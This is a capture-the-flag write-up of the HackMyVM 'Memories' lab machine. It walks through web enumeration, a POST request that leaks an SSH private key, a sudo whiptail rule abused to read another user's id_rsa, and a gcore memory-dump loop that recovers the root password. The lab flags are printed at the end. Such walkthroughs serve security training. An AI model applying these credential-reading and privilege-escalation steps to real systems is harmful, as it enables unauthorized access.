# 🧠 HackMyVM - Memories (Easy) Writeup

> **Machine:** Memories  
> **Platform:** HackMyVM  
> **Difficulty:** Easy  
> **Category:** Linux  
> **Author:** Naval  
> **Status:** Rooted ✅

---

# 📖 Overview

Today we are going to solve another **HackMyVM** easy-rated machine named **Memories**.

Unlike most HackMyVM machines, this one conveniently displays its IP address directly on the machine banner, allowing us to begin enumeration immediately.

---

# 🎯 Target Information

| Item | Value |
|------|-------|
| Machine | Memories |
| Difficulty | Easy |
| Operating System | Linux |
| Target IP | `192.168.56.128` |

---

# Reconnaissance

## Initial Port Scan

The first step is always to discover the exposed services.

We begin with a full TCP port scan using **Nmap**.

![Initial Scan](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q1.png))

Main Target IP

```
192.168.56.128
```

---

## Nmap Scan

Running an initial scan reveals only two open ports.

![Nmap Scan](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q2.png)

```
22/tcp open  ssh
80/tcp open  http
```

Since only SSH and HTTP are exposed, our attack surface is relatively small.

---

## Service Enumeration

Next, we perform service and version detection to identify the exact software running.

```
22/tcp
OpenSSH 7.9p1 Debian 10+deb10u2

80/tcp
Apache httpd 2.4.38 ((Debian))
```

The web server is using the default Apache page, while SSH is available but currently requires credentials or a valid key.

---

# Web Enumeration

## Visiting Port 80

Opening the website inside Burp Suite's browser shows nothing more than the default Apache landing page.

![Apache Default Page](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q3.png)

Although it appears uninteresting, default pages often hide additional resources that are not directly linked.

---

## Directory Enumeration

To discover hidden files and directories, directory fuzzing is performed.

![Directory Enumeration](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q4.png)

The results reveal:

```
/
index.html
icons/
robots.txt
```

Among these, **robots.txt** immediately stands out.

---

## robots.txt

Opening the robots file reveals an interesting hidden directory.

![robots.txt](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q5.png)

```
/memories
```

This directory is not linked from the homepage, making it our next target.

---

## Hidden Directory

Navigating to **/memories** presents an authentication prompt.

![Authentication Prompt](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q7.png)

Since authentication is required, we continue enumerating the application instead of attempting brute force.

---

# Further Enumeration

## Nikto Scan

Running **Nikto** against the web server uncovers an interesting behavior.

![Nikto](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q8.png)

One of the findings indicates a possible CORS-related issue on the `/memories` endpoint.

---

## Testing HTTP Methods

Changing the request method from **GET** to **POST** produces a completely different response.

![POST Request](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q9.png)

Instead of an authentication page, the server exposes sensitive content.

---

# Sensitive Information Disclosure

The POST request returns an entire **OpenSSH private key** belonging to user **laura**.

![Private Key](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q10.png)

```text
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

This is a critical information disclosure vulnerability.

The private key is saved locally.

```
chmod 600 laura_rsa
```

We then authenticate over SSH using the recovered key.

```
ssh -i laura_rsa laura@192.168.56.128
```

Successful login grants us an initial shell as **laura**.

---

# User Enumeration

## Looking for the User Flag

After gaining shell access, we begin searching for the user flag.

![Searching](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q11.png)

A recursive search does not immediately reveal the flag inside Laura's home directory.

---

## Interesting Home Directory

While enumerating the filesystem, another user's home directory becomes accessible.

![Lucy Directory](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q12.png)

```
/home/lucy
```

Although permission restrictions prevent direct access to everything, privilege escalation opportunities now become the focus.

---

# Privilege Escalation - Laura ➜ Lucy

Checking Laura's sudo permissions reveals an interesting binary.

![sudo -l](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q12.png)

```
sudo -l
```

Output:

```
(lucy) NOPASSWD:
/usr/bin/whiptail
```

---

## Exploiting Whiptail

`whiptail` can display arbitrary files.

By executing it as **lucy**, we can read files owned by Lucy.

```
sudo -u lucy /usr/bin/whiptail --textbox ../lucy/.ssh/id_rsa 40 80
```

This displays Lucy's private SSH key.

The key is copied and saved locally.

---

## Logging in as Lucy

After saving the private key:

```
chmod 600 lucy_rsa
```

Connect using SSH.

![Lucy Login](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q14.png)

```
ssh -i lucy_rsa lucy@192.168.56.128
```

Login succeeds.

---

# User Flag

Inside Lucy's home directory we finally obtain the user flag.

![User Flag](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q15.png)

```
user.txt

imissingsomething
```

User access is complete.

---

# Privilege Escalation - Lucy ➜ Root

Checking Lucy's sudo permissions reveals another interesting binary.

```
sudo -l
```

Output:

```
(ALL : ALL) NOPASSWD:
/usr/bin/gcore
```

---

## Understanding the Vulnerability

`gcore` creates a memory dump of running processes.

If a privileged process briefly executes and we dump its memory before it exits, sensitive information such as credentials may still reside inside the generated core file.

To automate this process, we continuously monitor running processes and immediately dump any process named **memories**.

```bash
while true
do
    ps aux | grep memories | awk '{print $2}' | xargs sudo /usr/bin/gcore
done
```

Eventually, a core dump of the privileged process is created.

The memory dump is then inspected using:

```bash
strings core.*
```

Within the dumped memory, the **root password** is recovered.

Using the recovered password:

```
su root
```
![Perms](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q16.png)

Root access is successfully obtained.

---

# Root Flag

After switching to the root account:

![Root Flag](https://github.com/naval0505/HackMyVM/blob/d7e198adfa7a18f42b48ac1aa222d96885d4a1c8/Memories%20-%20HackMyVM%20Machine%20Writeup/q17.png)

```
whoami

root
```

Reading the final flag:

```
cat /root/ro0t.txt
```

```
HMVtakingthisgames
```

Machine fully compromised.

---

# Attack Chain

```text
Nmap Scan
      │
      ▼
Apache Default Page
      │
      ▼
robots.txt
      │
      ▼
/memories
      │
      ▼
Authentication Prompt
      │
      ▼
Nikto Enumeration
      │
      ▼
POST Request
      │
      ▼
Laura SSH Private Key Disclosure
      │
      ▼
SSH Login as Laura
      │
      ▼
sudo -l
      │
      ▼
Whiptail File Read
      │
      ▼
Lucy SSH Private Key
      │
      ▼
SSH Login as Lucy
      │
      ▼
sudo gcore
      │
      ▼
Memory Dump
      │
      ▼
Extract Root Password
      │
      ▼
su root
      │
      ▼
Read Root Flag
```

---

# Vulnerabilities Identified

| Vulnerability | Severity |
|--------------|----------|
| Sensitive Information Disclosure (SSH Private Key) | Critical |
| Insecure HTTP Method Handling | High |
| Overly Permissive sudo (Whiptail) | High |
| Arbitrary File Read | High |
| Unsafe sudo Permission on gcore | Critical |
| Credentials Recoverable from Memory Dump | Critical |

---

# Tools Used

- Nmap
- Burp Suite
- Nikto
- SSH
- Linux Commands
- Whiptail
- gcore
- strings

---

# Lessons Learned

- Never expose private SSH keys through web applications.
- Hidden endpoints discovered through `robots.txt` should never be trusted as security controls.
- HTTP methods should always be validated consistently.
- Even harmless-looking binaries such as `whiptail` can become dangerous when executed with elevated privileges.
- `gcore` can leak highly sensitive information when granted through sudo.
- Memory forensics can expose credentials that were never intended to be accessible.

---

# Flags

| Flag | Value |
|------|-------|
| User Flag | `imissingsomething` |
| Root Flag | `HMVtakingthisgames` |

---

# Final Result

| Stage | Status |
|--------|--------|
| Reconnaissance | ✅ |
| Enumeration | ✅ |
| Initial Access | ✅ |
| User Privilege Escalation | ✅ |
| Root Privilege Escalation | ✅ |
| Root Flag | ✅ |

---

## Thanks for reading!

If you found this write-up helpful, consider giving the repository a ⭐. Happy Hacking! 🚀
